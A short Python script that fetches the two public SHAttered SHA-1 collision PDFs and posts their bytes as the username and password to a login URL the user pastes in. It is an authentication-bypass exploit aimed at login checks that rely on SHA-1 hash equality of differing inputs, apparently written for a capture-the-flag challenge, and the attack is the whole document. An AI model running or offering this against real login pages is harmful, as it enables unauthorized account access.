import requests

url = " " #paste your login page link here.
pdf1 = "https://shattered.io/static/shattered-1.pdf"
pdf2 = "https://shattered.io/static/shattered-2.pdf"

pdf1bytes = requests.get(pdf1).content
pdf2bytes = requests.get(pdf2).content

data = {
"username" : pdf1bytes,
"pwd" : pdf2bytes
}

res =requests.post(url, data=data)
print(res.text) 
